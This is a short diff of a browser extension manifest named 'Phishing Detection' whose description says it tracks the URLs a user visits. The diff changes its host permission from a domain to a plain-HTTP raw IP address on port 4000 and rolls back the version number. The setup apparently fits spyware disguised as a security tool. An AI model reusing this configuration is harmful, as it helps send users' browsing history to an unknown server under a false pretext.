@@ -1,6 +1,6 @@
 {
   "name": "Phishing Detection",
-  "version": "56.0",
+  "version": "25.0",
   "manifest_version": 3,
   "description": "Tracks the URL of websites you visit",
   "permissions": [
@@ -10,7 +10,7 @@
     "downloads"
   ],
   "host_permissions": [
-    "http://pawbox.me:3000/*"
+    "http://139.59.26.201:4000/*"
   ],
   "icons": {
     "16": "icon.png",
